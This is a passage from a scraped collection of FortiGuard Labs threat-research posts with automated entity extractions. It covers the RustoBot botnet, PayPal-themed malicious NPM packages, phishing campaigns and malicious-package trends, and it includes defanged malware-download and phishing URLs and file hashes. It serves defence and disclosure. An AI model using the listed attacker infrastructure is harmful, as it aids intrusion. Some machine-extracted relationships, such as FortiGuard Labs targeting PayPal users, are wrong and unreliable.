andpingCheck(CVE-2022-26187). When we analyzed the payload athxxp://66[.]63[.]187[.]69/mpsl, we identified another vulnerability—CVE-2024-12987—affecting DrayTek devices, which was exploited by attackers during the same period. This vulnerability is an OS command injection located in thecgi-bin/mainfunction.cgi/apmcfguploadinterface. These exploits occurred in four countries: Japan, Taiwan, Vietnam, and Mexico. All incidents were aimed at technology industries. In this section, our analysis of “RustoBot” focuses on the x86 architecture version. Attackers distribute this malware using four different downloader scripts and employ two distinct commands—wgetandtftp—to retrieve and install “RustoBot.” According to the downloader scripts, “RustoBot” targets five different architectures:arm5,arm6,arm7,mips, andmpsl. However, we also identified an additional x86 architecture variant hosted on the same server. Most of the observed incident payloads specifically target TOTOLINK devices using thempslarchitecture, as illustrated in Figure 2. The malware can be identified from its plaintext string written in Rust. Its entry point can be found after analyzing the second layer of the “start” function. “RustoBot” retrieves the offsets of system API functions from the Global Offset Table (GOT) and invokes them to carry out specific behaviors. It encodes its configuration via the XOR encryption algorithm and uses numerous calculations to achieve obfuscation. First, “RustoBot” sets constants into registers for the following steps. It then makes use of instructions like “xor,” “shr,” and, “rol” to get the decoder key’s offset. Lastly, XOR decodes the hard-coded cipher with the key obtained from the former offset. Once the configuration value is decoded, it is used as an argument for subsequent functions defined in the decoded configuration. “RustoBot” exhibits two primary malicious behaviors: the first is resolving the C2 server’s domain, and the second is launching a DDoS attack. It first sends an initial packet to retrieve IP address data—specifically, the victim host’s public IP address—which is returned by the attacker’s server. It uses DNS-over-HTTPS (DoH) to blend malicious traffic into normal HTTPS requests, helping it hide within large volumes of legitimate web traffic. The retrieved IP address is then used as the value of the header field “S,” which we surmise stands for “Source.” “RustoBot” attempts to resolve four domains:dvrhelper[.]anondns[.]net,techsupport[.]anondns[.]net,rustbot[.]anondns[.]net, andmiraisucks[.]anondns[.]net. All of these domains resolve to the same IP address:5[.]255[.]125[.]150. The botnet subsequently establishes a connection with5[.]255[.]125[.]150and receives a set of parameters that serve as commands to trigger a DDoS attack: It can launch DDoS attacks using three different protocols:Raw IP,TCP, andUDP. IoT and network devices are often poorly defended endpoints, making them attractive targets for attackers to exploit and deliver malicious programs. Strengthening endpoint monitoring and authentication can significantly reduce the risk of exploitation and help mitigate malware campaigns. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Mirai.AEH!tr.dldrELF/Mirai.CZX!trELF/Mirai.DCD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities: CVE-2022-26186: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26187: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26188: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26189: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2022-26210: TOTOLINK.Devices.cstecgi.Command.InjectionCVE-2024-12987: DrayTek.Routers.apmcfgupload.Command.Injection We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://66[.]63[.]187[.]69/w.shhxxp://66[.]63[.]187[.]69/wget.shhxxp://66[.]63[.]187[.]69/thxxp://66[.]63[.]187[.]69/tftp.shhxxp://66[.]63[.]187[.]69/arm5hxxp://66[.]63[.]187[.]69/arm6hxxp://66[.]63[.]187[.]69/arm7hxxp://66[.]63[.]187[.]69/mipshxxp://66[.]63[.]187[.]69/mpslhxxp://66[.]63[.]187[.]69/x86 dvrhelper[.]anondns[.]nettechsupport[.]anondns[.]netrustbot[.]anondns[.]netmiraisucks[.]anondns[.]net5[.]255[.]125[.]150 Downloader 76a487a46cfeb94eb5a6290ceffabb923c35befe71a1a3b7b7d67341a40bc45475d031e8faaf3aa0e9cafd5ef0fd7de1a2a80aaa245a9e92bae6433a17f48385fbdd5cba193a5e097cd12694efe14a15eb0fc059623f82da6c0bf99cbcfa22f80dde88e9e5a0670e19c3b3e864de1b6319aaf92989739602e55b494b09873fbe <RustoBot> 15c9d7a63fa419305d7f2710b63f71cc38178973c0ccf6d437ce8b6feeca4ee1427399864232c6c099f183704b23bff241c7e0de642e9eec66cc56890e8a63044f0ba25183ecb79a0721037a0ff9452fa8c19448f82943deca01b36555f2cc99c0abb19b3a72bd2785e8b567e82300423da672a463eefdeda6dd60872ff0e072dae8dae748be54ba0d5785ab27b1fdf42b7e66c48ab19177d4981bcc032cfb1c9f098920613bd0390d6485936256a67ae310b633124cfbf503936904e69a81bfe547306d6dee4b5b2b6ce3e989b9713a5c21ebe3fefa0f5c1a1ea37cec37e20fb910e77ee686d7d6769fab8cb8f9b17a4609c4e164bb4ed80d9717d9ddad364f44a526f20c592fd95b4f7d61974c6f87701e33776b68a5d0b44ccd2fa3f48c5defb0153047b08aa1876e1e4e97a082f6cb05af75479e1e9069b77d98473a11f49a9b5bdeb1f23736ceffba623c8950d627a791a0b40c4d44ae2f80e02a43955d5dc90cbb0f69f283ccf52a2a79b3dfe94ee8b3474cf6474cfcbe9f66f245a55db68e2d852ad157fc01da34e11aa24a5ab30845b706d7827b8119a3e648ce2cf19e660ce74e1bdb0a75293758200b03efd5f807e7896665addb684e0ffb53afd2ec9e77f1185f644462305184cf8afcf5d12c7eb524a2d3f4090a658a198c20ce114b460012412411363c9a3ab0246e48a584ce86fc6c0b7855495ec531dd05a11697fd5230f7f09a7b43fee1a1693013ed98beeb7a182cd3f0393d93dd1b7576 botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (TOTOLINK N600R V4.3.0cu.7570_B20200620, Device), (TOTOLINK A830R V5.9c.4729_B20191112, Device), (A3100R V4.1.2cu.5050_B20200504, Device), (A950RG V4.1.2cu.5161_B20200903, Device), (A800R V4.1.2cu.5137_B20200730, Device), (A3000RU V5.9c.5185_B20201128, Device), (A810R V4.1.2cu.5182_B20201026, Device), (DrayTek Vigor2960, Device), (DrayTek Vigor300B 1.5.1.4, Device), (RustoBot, Malware), (Mozilla, Organization), (command injection, Vulnerability)\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "TOTOLINK N600R V4.3.0cu.7570_B20200620",
          "Device"
        ],
        [
          "TOTOLINK A830R V5.9c.4729_B20191112",
          "Device"
        ],
        [
          "A3100R V4.1.2cu.5050_B20200504",
          "Device"
        ],
        [
          "A950RG V4.1.2cu.5161_B20200903",
          "Device"
        ],
        [
          "A800R V4.1.2cu.5137_B20200730",
          "Device"
        ],
        [
          "A3000RU V5.9c.5185_B20201128",
          "Device"
        ],
        [
          "A810R V4.1.2cu.5182_B20201026",
          "Device"
        ],
        [
          "DrayTek Vigor2960",
          "Device"
        ],
        [
          "DrayTek Vigor300B 1.5.1.4",
          "Device"
        ],
        [
          "RustoBot",
          "Malware"
        ],
        [
          "Mozilla",
          "Organization"
        ],
        [
          "command injection",
          "Vulnerability"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 0
  },
  {
    "title": "Malicious NPM Packages Targeting PayPal Users",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-npm-packages-targeting-paypal-users",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs’ AI-driven OSS malware detection system has recently discovered a series of malicious NPM packages designed to steal sensitive information from compromised systems. These packages are believed to have been created between March 5 and March 14 by a threat actor known astommyboy_h1andtommyboy_h2to targetPayPalusers. PayPal is a widely used platform holding sensitive financial information. Using PayPal-related names helps these malicious packages avoid detection, making it easier for attackers to steal sensitive information. By including \"PayPal\" in the name of the malicious packages, such asoauth2-paypalandbuttonfactoryserv-paypal, the attackers also create a false sense of legitimacy, tricking developers into installing them. The code collects and exfiltrates system data, such as usernames and directory paths, which can then be used to target PayPal accounts or be sold for fraudulent purposes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The code has very similar characteristics, aiming to steal sensitive information and send it to remote servers. Users would lose their private info without knowing it. The preinstall hook runs a malicious script automatically before the package is installed, bypassing user or security tool detection. The script collects system data like the current user, working directory, and hostname, which helps the attacker understand the environment for further malicious actions. This information is then encoded into hexadecimal format and obfuscated by truncating and splitting directory paths to make it harder for security measures to detect. The obfuscated data is sent to an external server controlled by the attacker, with the dynamically generated URL making it more difficult to block. The sensitive data exfiltrated may be used in further attacks. The hacker published numerous malicious packages in a short time. These attacks function by using a \"preinstall hook\" in malicious NPM packages, automatically running a script when the package is installed. This script collects system information, like the user, hostname, and directory paths, and then sends it to an attacker-controlled server. To spot a compromise, look for unusual NPM packages with names like \"paypal\" (e.g., oauth2-paypal or buttonfactoryserv-paypal). Other signs include unexpected network connections to unknown servers, so also check your network logs for any suspicious activity. If you find any suspicious packages, remove them, change compromised credentials, and scan your system for further threats. Make sure your security software is up to date to detect such issues. The authors oftommyboy_h1andtommyboy_h2are likely the same person, publishing multiple malicious packages in a short time. We suspect that the same author created these packages to targetPayPalusers. We urge the public to be cautious when downloading packages and to ensure they are from trusted sources to avoid falling victim to such attacks. FortiGuard AntiVirusdetects the malicious files identified in this report as: bankingbundleserv_1.20.0: Bash/TommyBoy.A!trbuttonfactoryserv-paypal_3.50.0: Bash/TommyBoy.A!trbuttonfactoryserv-paypal_3.99.0:Bash/TommyBoy.A!trtommyboytesting_1.0.1:Bash/TommyBoy.A!trtommyboytesting_1.0.2:Bash/TommyBoy.A!trtommyboytesting_1.0.5:Bash/TommyBoy.A!trtommyboytesting_1.0.6:Bash/TommyBoy.A!trtommyboytesting_1.0.7:Bash/TommyBoy.A!trtommyboytesting_1.0.8:Bash/TommyBoy.A!trtommyboytesting_1.0.9:Bash/TommyBoy.A!trtommyboytesting_1.0.10:Bash/TommyBoy.A!trtommyboytesting_1.0.11:Bash/TommyBoy.A!trtommyboytesting_1.0.12:Bash/TommyBoy.A!trcompliancereadserv-paypal_2.1.0:Bash/TommyBoy.A!troauth2-paypal_0.6.0:Bash/TommyBoy.A!troauth2-paypal_1.6.0:Bash/TommyBoy.A!troauth2-paypal_2.6.0:Bash/TommyBoy.A!troauth2-paypal_4.8.0:Bash/TommyBoy.A!troauth2-paypal_7.5.0:Bash/TommyBoy.A!troauth2-paypal_10.0.0:Bash/TommyBoy.A!troauth2-paypal_699.0.0:Bash/TommyBoy.A!trPaymentapiplatformservice-paypal_1.20.0:Bash/TommyBoy.A!trUserbridge-paypal_1.20.0:Bash/TommyBoy.A!truserrelationship-paypal_1.20.0:Bash/TommyBoy.A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hash (sha256) Detection bankingbundleserv_1.20.0 796deae716a6d66b49a99d00e541056babe34fd2fcbcea0380491de4b792afba Bash/TommyBoy.A!tr buttonfactoryserv-paypal_3.50.0 18e45358462363996688ceabfc098e17f855d73842f460b34c683e58c728149f Bash/TommyBoy.A!tr buttonfactoryserv-paypal_3.99.0 88bd580aa51129e4e5fa69e148131874c862015e7c51d59497e11f22db2d72c6 Bash/TommyBoy.A!tr tommyboytesting_1.0.1 23664decf3c2f28a3f552dc98d90017926617969713ccccdc9f5fd3178d76dbf Bash/TommyBoy.A!tr tommyboytesting_1.0.2 ba63fbf6f7bab000bc1b1bf92319415328cea238872450adbaac6a6069132779 Bash/TommyBoy.A!tr tommyboytesting_1.0.5 f359b687fb9e1a4c27fdf5174380abc9877f940ef6a6fd4d38e9ef40bb778107 Bash/TommyBoy.A!tr tommyboytesting_1.0.6 815ebfc4fb5bddf1f9ca1b12ae2a1b0e37736a93ea9babe858747096ad9ce671 Bash/TommyBoy.A!tr tommyboytesting_1.0.7 d21ae84e104a305b5aebee8e6fbb4837976ef26935dac90372637f913ef58154 Bash/TommyBoy.A!tr tommyboytesting_1.0.8 0c006540abcb768cad80a1a8ced926fa58f10cf9eb0be16c4185850df83bff82 Bash/TommyBoy.A!tr tommyboytesting_1.0.9 847e684a228292dc905205d7353ed9458e10129105fe3b387c4e9374d6afd783 Bash/TommyBoy.A!tr tommyboytesting_1.0.10 ed6a350c4b1baa6f098293c328d0a62d35aafb4ab62b93e6f3a611f06be9aa29 Bash/TommyBoy.A!tr tommyboytesting_1.0.11 123480357ab54d2c2067640105b5683445777ae1d20fd52551a5df9327692103 Bash/TommyBoy.A!tr tommyboytesting_1.0.12 3710742057e470e8882a84412721ed19652e3f13977af21a937bad27d75b6f96 Bash/TommyBoy.A!tr compliancereadserv-paypal_2.1.0 dd1a177126d48072381db98af74c964100c8ef2e43286f3a31114461251a164c Bash/TommyBoy.A!tr oauth2-paypal_0.6.0 0d8c5bb69c567e3949cc6e087610d79c886d9140d0eda88cc92d3ec63fb7a3b9 Bash/TommyBoy.A!tr oauth2-paypal_1.6.0 b6bc001bc9b4171a27fb2a485cb3e3d8f23bc1ee6b4a03bbcfbba63b7d208477 Bash/TommyBoy.A!tr oauth2-paypal_2.6.0 2c7bf841a659fa1d8105d26f6664ebc3a78b99e0c071eb7f529503346c40f778 Bash/TommyBoy.A!tr oauth2-paypal_4.8.0 cbbe1d5a7d4a721c61b9c3b8b6a8e5d65508f02c70e708698d8165d92e154383 Bash/TommyBoy.A!tr oauth2-paypal_7.5.0 25034c2542757ac93cb6008479a5bfc594f9e92f66249f6fb862447a18847ba7 Bash/TommyBoy.A!tr oauth2-paypal_10.0.0 148d3552db2acf469c84e26889336f06167c6cf455248e08d703282bc0556fb8 Bash/TommyBoy.A!tr oauth2-paypal_699.0.0 7186674c208242b8e6fdf7b0f4e7539218590618fee517aa264e8446247d3440 Bash/TommyBoy.A!tr Paymentapiplatformservice-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy.A!tr Userbridge-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy.A!tr userrelationship-paypal_1.20.0 ca7dc2b0856f89e71ce9da6f179b34c8879456b5dffda0b5bd3f0fd73bab1c50 Bash/TommyBoy.A!tr Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Company), (OSS malware detection system, Tool), (NPM packages, File), (stolen sensitive information, Exploit), (PayPal users, Target), (PayPal, Organization), (PayPal-related names, Linked to), (OAuth2-paypalandbuttonfactoryserv-paypal, File), (system data, Exploit), (private info, Exploit), (remote servers, Target), (preinstall hook, Technique), (malicious script, Tool), (current user, Exploit), (wors[.]Global Threat Landscape Report, Report), (exploit, Exploit)\nRelationships: (FortiGuard Labs, develops, OSS malware detection system), (OSS malware detection system, detects, NPM packages), (NPM packages, include, stolen sensitive information), (stolen sensitive information, exploitedBy, PayPaylusers), (PayPal users, targetedBy, FortiGuard Labs), (PayPal, uses, OAuth2-paypalandbuttonfactoryserv-paypal), (PayPal, uses, system data), (system data, collectedBy, malicious script), (PayPal, uses, remote servers), (PayPal, uses, preinstall hook)",
      "entities": [
        [
          "FortiGuard Labs",
          "Company"
        ],
        [
          "OSS malware detection system",
          "Tool"
        ],
        [
          "NPM packages",
          "File"
        ],
        [
          "stolen sensitive information",
          "Exploit"
        ],
        [
          "PayPal users",
          "Target"
        ],
        [
          "PayPal",
          "Organization"
        ],
        [
          "PayPal-related names",
          "Linked to"
        ],
        [
          "OAuth2-paypalandbuttonfactoryserv-paypal",
          "File"
        ],
        [
          "system data",
          "Exploit"
        ],
        [
          "private info",
          "Exploit"
        ],
        [
          "remote servers",
          "Target"
        ],
        [
          "preinstall hook",
          "Technique"
        ],
        [
          "malicious script",
          "Tool"
        ],
        [
          "current user",
          "Exploit"
        ],
        [
          "wors[.]Global Threat Landscape Report",
          "Report"
        ],
        [
          "exploit",
          "Exploit"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "develops",
          "OSS malware detection system"
        ],
        [
          "OSS malware detection system",
          "detects",
          "NPM packages"
        ],
        [
          "NPM packages",
          "include",
          "stolen sensitive information"
        ],
        [
          "stolen sensitive information",
          "exploitedBy",
          "PayPaylusers"
        ],
        [
          "PayPal users",
          "targetedBy",
          "FortiGuard Labs"
        ],
        [
          "PayPal",
          "uses",
          "OAuth2-paypalandbuttonfactoryserv-paypal"
        ],
        [
          "PayPal",
          "uses",
          "system data"
        ],
        [
          "system data",
          "collectedBy",
          "malicious script"
        ],
        [
          "PayPal",
          "uses",
          "remote servers"
        ],
        [
          "PayPal",
          "uses",
          "preinstall hook"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 16,
    "relationship_count": 10
  },
  {
    "title": "Real-Time Anti-Phishing: Essential Defense Against Evolving Cyber Threats",
    "link": "https://www.fortinet.com/blog/threat-research/real-time-anti-phishing-essential-defense-against-evolving-cyber-threats",
    "content": "FortiGuard Labs Threat Research Phishing remains one of the most prevalent cybersecurity threats worldwide, posing risks such as financial loss, data theft, reputational harm, and malware deployment. As phishing tactics grow more sophisticated, attackers are also expanding their targets across various platforms and services. The use of AI has further refined these techniques, making phishing attempts more deceptive and harder to detect. Attackers increasingly use personalized messages and convincing fake websites to evade traditional security measures, making detection more difficult for security teams. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Organizations must strengthen their defenses to keep pace with the rapidly evolving threat landscape. While traditional defenses like email filters and blacklists can block known threats, they are less effective against emerging and AI-driven phishing attacks. Real-time anti-phishing (RTAP) solutions help address this challenge by using AI and machine learning to identify and mitigate both large-scale phishing campaigns and highly targeted spear-phishing attacks as they occur. According to the 2024 Verizon DBIR report, the median time for a user to fall prey to a phishing email is less than 60 seconds.[1] Over the past several weeks, threat data gathered by FortiGuard Labs reveals critical insights into the nature of phishing campaigns and the primary targets. These insights provide a snapshot of how cybercriminals are evolving their tactics to reach unsuspecting users. 1. Facebook is a Consistent Target: Our recent monitoring of phishing attacks has shown Facebook to a top target for phishing emails. Its widespread use and abundant personal information associated with accounts make it appealing to cybercriminals seeking to steal login credentials or exploit user data. Many phishing websites attempt to deceive users by claiming their account has been disabled or requires verification. 2. Roblox Targeting: In mid-February, a spike in phishing attempts targeted Roblox, a popular gaming platform among younger users. Phishing emails appeared disguised as account alerts or prize notifications, prompting victims to click on malicious links or provide sensitive or personal details. 3. Broad Targeting the End of January: The final days of January saw a broad range of platforms targeted by phishing attempts. These included: oTelegram:A widely used and encrypted messaging app.oIonos:A Germany-based email, hosting, and cloud services provider.oCoinbase:A popular cryptocurrency exchange.oPayPal:A worldwide used online payment system.oLazada:An e-commerce platform operating primarily in Southeast Asia.oiTrust:A cryptocurrency platform.oVkontakte:A Russian social media platform. FortiGuard Labs provides an advanced RTAP service as part of our FortiSandbox Advanced AI Subscription Bundle. This service provides comprehensive and proactive protection against phishing emails and other cyber threats. The RTAP solution built into FortiSandbox uses a variety of techniques to identify and block phishing emails, including: RTAP from FortiGuard Labs ensures that even previously unseen and unknown phishing attempts—which may not be recognized by traditional security systems—are detected and blocked. Human error remains one of the primary reasons phishing attacks succeed, making employee awareness and education essential for defense. Training staff to recognize and report phishing attempts can significantly reduce an organization’s risk. A well-informed workforce serves as the first line of defense against today’s increasingly sophisticated phishing tactics. The 2024 Verizon DBIR highlights this challenge, revealing that 68% of all breaches involved a non-malicious human factor—either through social engineering or unintentional mistakes.[1] Fortinet’sFortiPhishandFortiSATempower organizations to strengthen their human firewall. FortiPhish provides phishing simulation and awareness training, while FortiSAT provides critical security awareness training to create a cyber-aware workforce. Implementing these proactive training tools will enhance employee awareness, bolster technical defenses, and reduce the risk of successful phishing attacks. As phishing attacks grow more sophisticated, real-time, adaptive cybersecurity solutions are crucial for effective defense. FortiGuard’s advanced anti-phishing capabilities, powered by AI and machine learning, provide continuous protection by detecting and neutralizing new phishing techniques as they emerge. With RTAP’s real-time threat response, FortiGuard helps businesses and individuals safeguard their digital environments to reduce risk and stay ahead of cybercriminals. [facebook]case-id-10012125556[.]vercel[.]apppolicy-violation-10002321704[.]github[.]io [roblox]robux-generator---cpa[.]firebaseapp[.]comrbxodi[.]blogspot[.]com [telegram]www[.]telegramtgtg[.]comwww[.]91gsh[.]com [ionos]67a34b6bfc0d210a820d0cf5--brilliant-mermaid-bad0bd[.]netlify[.]appgworldhomes[.]com/ionos-ag/ionos-es/login/login[.]php [coinbase]000414-coinbase[.]comcoinbsphnnumbe[.]gitbook[.]io/us [paypal]paypalloginonline[.]blogspot[.]comniemalssoeder[.]de/c/index/myaccount [vkontakte]uncloabatles[.]ru/votes/7838610vim[.]vimeo18[.]ru/votes/3818905 [1]https://www.verizon.com/business/resources/infographics/2024-dbir-infographic.pdf phishing FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research Phishing, Threat Type), (AI, Technique), (email filter, Tool), (blacklist, Tool), (real-time anti-phishing (RTAP), Tool), (Verizon DBIR report, Document), (median time for a user to fall prey to a phishing email, Metric)\nRelationships: (FortiGuard Labs Threat Research Phishing, causes, financial loss), (FortiGuard Labs Threat Research Phishing, causes, data theft), (FortiGuard Labs Threat Research Phishing, causes, reputational harm), (FortiGuard Labs Threat Research Phishing, causes, malware deployment), (FortiGuard Labs Threat Research Phishing, targets, various platforms and services), (FortiGuard Labs Threat Research Phishing, expands its targets, AI-driven phishing attacks), (FortiGuard Labs Threat Research Phishing, evades, traditional security measures), (FortiGuard Labs Threat Research Phishing, uses, personalization), (FortiGuard Labs Threat Research Phishing, uses, convincing fake websites), (FortiGuard Labs Threat Research Phishing, makes detection, difficult), (FortiGuard Labs Threat Research Phishing, uses, real-time anti-phishing (RTAP)), (FortiGuard Labs Threat Research Phishing, requires, strengthening defenses), (FortiGuard Labs Threat Research Phishing, uses, email filters), (FortiGuard Labs Threat Research Phishing, uses, blacklists), (",
      "entities": [
        [
          "FortiGuard Labs Threat Research Phishing",
          "Threat Type"
        ],
        [
          "AI",
          "Technique"
        ],
        [
          "email filter",
          "Tool"
        ],
        [
          "blacklist",
          "Tool"
        ],
        [
          "Verizon DBIR report",
          "Document"
        ],
        [
          "median time for a user to fall prey to a phishing email",
          "Metric"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research Phishing",
          "causes",
          "financial loss"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "causes",
          "data theft"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "causes",
          "reputational harm"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "causes",
          "malware deployment"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "targets",
          "various platforms and services"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "expands its targets",
          "AI-driven phishing attacks"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "evades",
          "traditional security measures"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "uses",
          "personalization"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "uses",
          "convincing fake websites"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "makes detection",
          "difficult"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "uses",
          "real-time anti-phishing (RTAP"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "requires",
          "strengthening defenses"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "uses",
          "email filters"
        ],
        [
          "FortiGuard Labs Threat Research Phishing",
          "uses",
          "blacklists"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 6,
    "relationship_count": 14
  },
  {
    "title": "Fortinet Identifies Malicious Packages in the Wild: Insights and Trends from November 2024 Onward",
    "link": "https://www.fortinet.com/blog/threat-research/fortinet-identifies-malicious-packages-in-the-wild-insights-and-trends",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has analyzed malicious software packages detected from November 2024 to the present, identifying various techniques used to exploit system vulnerabilities. This analysis provides insights into the evolving threat landscape and emerging attack methods. FortiGuard Labs leverages our proprietary, AI-driven OSS malware detection system to track and examine these threats. By reviewing the tactics observed—such as low-file-count packages designed to evade detection, command overwrite techniques, and typosquatting—this report outlines key trends and their potential impact on system security. Since November 2024, Fortinet's automated threat detection platform has identified multiple malicious software packages, revealing various attack techniques used to exploit system vulnerabilities. These analyses show that attackers are employing methods such as obfuscation and install scripts to bypass traditional security measures. This report provides an overview of the identified threats and the techniques observed, reinforcing the importance of robust detection and security strategies in software environments. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs' analysis has identified a range of techniques used by attackers to compromise systems, including both well-known and less common methods: While not necessarily malicious on its own,the majority of detected malicious packages (1,082) exhibit a low file count, often containing minimal code designed to evade detection while enabling exploits such as data theft, unauthorized access, or system compromise. Common indicators include command overwrites, where attackers modify installation commands to introduce malicious code or bypass security, suspicious behavior flagged by machine learning systems due to anomalous patterns, and obfuscation techniques like base64 encoding or encryption to conceal harmful payloads. These tactics combine to create lightweight, evasive threats that are challenging to detect but capable of significant damage. While not all install scripts are malicious, threat actors often use them to silently deploy harmful code during installation, sometimes bypassing security checks.These scripts can modify the standard installation process to execute harmful actions without the user’s knowledge. For example, an install script may include HTTP POST requests for data exfiltration, suspicious API calls like https.get or https.request to communicate with external servers, and hardcoded URLs, such as Discord webhooks, for receiving stolen data. These actions suggest the script is setting up a backdoor or preparing the system for further malicious activities, highlighting the need for careful scrutiny of installation scripts to detect and mitigate potential threats. Packages lacking a repository URL raise concerns about their legitimacy and transparency, as they often lack clear provenance or accountability, which is typical of malicious software. Without a public repository, verifying the source, tracking development, or assessing potential security issues is difficult. Malicious actors may avoid repositories to evade scrutiny and prevent code inspection, reducing the chances of detection. A missing repository URL, combined with other red flags like suspicious APIs or URLs, increases the likelihood that the package is designed for exploitation, data theft, or other malicious activities. Suspicious URLs are a key indicator of potentially malicious packages, as they are often used to download additional payloads or establish communication with command-and-control (C&C) servers, giving attackers control over infected systems. These URLs may appear legitimate, disguising their harmful intent to evade detection. Common tactics include using shortened or dynamic URLs, hosting malicious content on trusted platforms, or disguising payloads as safe files. In 974 packages, such URLs are linked to the risk of data exfiltration, further malware downloads, and other malicious actions. It is crucial to scrutinize and monitor external URLs in package dependencies to prevent exploitation. While essential for software functionality, APIs can be weaponized by malicious actors to perform harmful activities. In 681 detected cases, suspicious APIs like https.get and https.request were used to exfiltrate data, enable command-and-control (C&C) communication, or obscure malicious intent. These APIs may send sensitive information to remote servers or allow remote control of compromised systems. In one example, the use of https.get and https.request in index.js suggests data exfiltration or communication with external sources, a common tactic in malware. Combined with other red flags, such as suspicious URLs, these API calls indicate the potential for malicious or compromised projects. Recently discovered malicious Python packages AffineQuant-99.6, amzn-aws-glue-ml-libs-python-6.1.5, and amzn-awsglue-6.1.4, exploit the setup.py file to silently collect system information, including the MAC address, hostname, username, and current directory, and sends this data to remote servers controlled by the attacker. The script uses system commands (getmac for Windows, ifconfig for Linux/macOS) to retrieve the MAC address, base64-encoded it, and send it to hidden URLs. A custom installation process using setuptools to override the installation routine ensures the malicious payload runs after the package is installed. This type of attack has been identified in multiple packages and highlights the risk developers face when installing packages from untrusted sources—potentially leading to stolen credentials, system data, and further attacks. To protect themselves, developers should install packages only from trusted sources, review package content before installation, use virtual environments to isolate installs, scan for vulnerabilities with security tools, and keep dependencies up to date. A malicious script (seller-admin-common_6.5.8, seller-rn-mng-lib_6.5.8. ) is designed to secretly collect sensitive information from a victim’s machine and send it to an external server via a Discord webhook. Upon execution, the script retrieves the internal IP address of the victim’s machine and fetches the external IP address by making an HTTPS request to an online API. It also gathers system details, such as the hostname, username, DNS servers, home directory, and application information. This collected data is then bundled into a JSON object and sent to the attacker’s server, where it can be accessed for further malicious purposes. The combination of internal and external IP addresses, DNS settings, and user details makes the attack highly invasive, enabling attackers to track the victim’s machine and potentially exploit the information for further attacks. Using a Discord webhook adds a layer of stealth, allowing the attacker to collect the stolen data without raising suspicion, making this type of data harvesting ideal for gathering intelligence or executing more targeted cyberattacks. A recently identified malicious JavaScript code found in the package xeno.dll_1.0.2 utilizes obfuscation techniques to disguise its true intentions. Upon installation, it logs keystrokes to capture private information such as passwords and credit card details, which are then encrypted and sent to a remote server controlled by the attacker. Additionally, the script installs a backdoor that provides remote access with elevated privileges, giving the attacker full control of the system. The backdoor also collects system-specific data, such as the operating system version, installed applications, and network configuration, and sends it to the attacker’s server for future exploitation. Disguised as a legitimate service, the attacker’s server makes the malicious activity harder to detect. This stealthy combination of keylogging and remote access allows the attacker to steal sensitive data and conduct further attacks, posing a significant threat to the victim's privacy and system integrity. The data from FortiGuard Labs’ analysis reveals a diverse array of malicious packages, showcasing the wide range of tactics used by cybercriminals. From simple low-file-count packages to 